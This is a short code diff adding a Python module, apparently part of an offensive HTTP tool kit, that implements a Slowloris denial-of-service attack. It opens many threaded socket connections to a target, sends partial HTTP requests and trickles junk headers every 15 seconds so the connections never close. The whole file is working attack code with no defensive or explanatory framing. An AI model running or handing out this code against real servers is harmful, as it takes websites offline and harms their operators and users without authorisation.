@@ -1,0 +1,35 @@
+import random
+import socket
+import time
+
+from http_strike_kit.utils.thread_exec import ThreadedExecutor
+
+
+def _send_slowloris_request(target: str, port: int, timeout: float):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((target, port))
+
+        s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode("utf-8"))
+        s.send(f"Host: {target}\r\n".encode("utf-8"))
+
+        while True:
+            try:
+                time.sleep(15)
+                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
+            except socket.error:
+                break
+    except Exception:
+        pass
+
+
+def slowloris_attack(target: str, port: int, timeout: float, workers: int):
+    executor = ThreadedExecutor(max_workers=workers)
+    executor.start()
+
+    try:
+        while True:
+            executor.submit(_send_slowloris_request, target, port, timeout)
+    except KeyboardInterrupt:
+        executor.wait()
